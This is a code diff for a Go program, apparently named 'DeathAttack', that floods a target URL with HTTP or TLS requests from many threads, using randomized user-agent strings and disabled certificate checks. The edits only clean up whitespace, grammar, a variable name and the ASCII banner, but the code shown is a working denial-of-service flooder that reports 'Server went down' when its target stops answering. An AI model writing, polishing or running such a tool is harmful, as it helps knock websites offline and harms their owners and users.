@@ -72,10 +72,10 @@ var (
 )
 
 func init() {
-	rand.Seed(time.Now().UnixNano()) 
+	rand.Seed(time.Now().UnixNano())
 }
-func getuseragent() string {
 
+func getuseragent() string {
 	platform := choice[rand.Intn(len(choice))]
 	var os string
 	if platform == "Macintosh" {
@@ -105,7 +105,7 @@ func getuseragent() string {
 	return spider[rand.Intn(len(spider))]
 }
 
-func contain(char string, x string) int { 
+func contain(char string, x string) int {
 	times := 0
 	ans := 0
 	for i := 0; i < len(char); i++ {
@@ -175,19 +175,19 @@ func flood() {
 	}
 	var s net.Conn
 	var err error
-	<-start 
+	<-start
 	for {
 		if port == "443" {
 			cfg := &tls.Config{
 				InsecureSkipVerify: true,
-				ServerName:         host, 
+				ServerName:         host,
 			}
 			s, err = tls.Dial("tcp", addr, cfg)
 		} else {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Server went down") 
+			fmt.Println("Server went down")
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -204,23 +204,25 @@ func flood() {
 }
 
 func main() {
-	fmt.Println("    ____                   __  __    ___   __  __             __  ")
-	fmt.Println("   / __ \___  ____ ___  __/ /_/ /_  /   | / /_/ /_____ ______/ /__")
-	fmt.Println("  / / / / _ \/ __  / / / / __/ __ \/ /| |/ __/ __/ __  / ___/ //_/")
-	fmt.Println(" / /_/ /  __/ /_/ / /_/ / /_/ / / / ___ / /_/ /_/ /_/ / /__/  <   ")
-	fmt.Println("/_____/\___/\__ _/\__ _/\__/_/ /_/_/  |_\__/\__/\__ _/\___/_/|_|  ")
+	fmt.Println(`
+    ____                   __  __    ___   __  __             __  
+   / __ \___  ____ ___  __/ /_/ /_  /   | / /_/ /_____ ______/ /__
+  / / / / _ \/ __  / / / / __/ __ \/ /| |/ __/ __/ __  / ___/ //_/
+ / /_/ /  __/ /_/ / /_/ / /_/ / / / ___ / /_/ /_/ /_/ / /__/  <   
+/_____/\___/\__ _/\__ _/\__/_/ /_/_/  |_\__/\__/\__ _/\___/_/|_|  
+`)
 
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("Input the URL: ")
-	url, _ := reader.ReadString('\n')
-	url = strings.TrimSpace(url)
+	targetURL, _ := reader.ReadString('\n')
+	targetURL = strings.TrimSpace(targetURL)
 
 	fmt.Print("Input the amount of threads: ")
 	threadsStr, _ := reader.ReadString('\n')
 	threadsStr = strings.TrimSpace(threadsStr)
 	threads, err := strconv.Atoi(threadsStr)
 	if err != nil {
-		fmt.Println("Threads should be a integer")
+		fmt.Println("Threads should be an integer")
 		return
 	}
 
@@ -233,16 +235,16 @@ func main() {
 	limitStr = strings.TrimSpace(limitStr)
 	limit, err := strconv.Atoi(limitStr)
 	if err != nil {
-		fmt.Println("limit should be a integer")
+		fmt.Println("Limit should be an integer")
 		return
 	}
 
-	headerFile := "header.txt" 
+	headerFile := "header.txt"
 	fmt.Printf("Using header file: %s\n", headerFile)
 
-	u, err := url.Parse(url)
+	u, err := url.Parse(targetURL)
 	if err != nil {
-		println("Please input a correct url")
+		println("Please input a correct URL")
 		return
 	}
 	tmp := strings.Split(u.Host, ":")
@@ -269,22 +271,24 @@ func main() {
 
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
-		go flood() 
+		go flood()
 		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
 		os.Stdout.Sync()
 	}
-	fmt.Printf("\nPlease [Enter] for continue")
+	fmt.Printf("\nPlease [Enter] to continue")
 	_, err = reader.ReadString('\n')
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
-	fmt.Println("    ____                   __  __    ___   __  __             __  ")
-	fmt.Println("   / __ \___  ____ ___  __/ /_/ /_  /   | / /_/ /_____ ______/ /__")
-	fmt.Println("  / / / / _ \/ __  / / / / __/ __ \/ /| |/ __/ __/ __  / ___/ //_/")
-	fmt.Println(" / /_/ /  __/ /_/ / /_/ / /_/ / / / ___ / /_/ /_/ /_/ / /__/  <   ")
-	fmt.Println("/_____/\___/\__ _/\__ _/\__/_/ /_/_/  |_\__/\__/\__ _/\___/_/|_|  ")
+	fmt.Println(`
+    ____                   __  __    ___   __  __             __  
+   / __ \___  ____ ___  __/ /_/ /_  /   | / /_/ /_____ ______/ /__
+  / / / / _ \/ __  / / / / __/ __ \/ /| |/ __/ __/ __  / ___/ //_/
+ / /_/ /  __/ /_/ / /_/ / /_/ / / / ___ / /_/ /_/ /_/ / /__/  <   
+/_____/\___/\__ _/\__ _/\__/_/ /_/_/  |_\__/\__/\__ _/\___/_/|_|  
+`)
 
 	fmt.Println("Flood will end in " + limitStr + " seconds.")
 	close(start)
